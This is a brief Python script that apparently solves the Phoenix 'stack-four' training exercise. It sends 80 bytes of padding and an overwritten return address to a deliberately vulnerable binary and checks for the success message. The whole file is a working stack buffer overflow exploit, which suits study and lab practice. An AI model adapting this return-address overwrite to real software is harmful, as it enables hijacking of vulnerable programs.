from subprocess import Popen, PIPE


FILE_PATH = "/opt/phoenix/i486/stack-four"

ret_addr = bytearray.fromhex("080484e5")[::-1]
ret_addr_offset = 4  # ebp -> 4 -> ret
buf_offset = 76  # buf -> 76 -> ebp
padding_len = ret_addr_offset + buf_offset
padding = ("A" * padding_len).encode()
payload = padding + ret_addr

p = Popen(FILE_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
assert "Congratulations, you've finished phoenix/stack-four :-) Well done!" in reply
print("Success!")


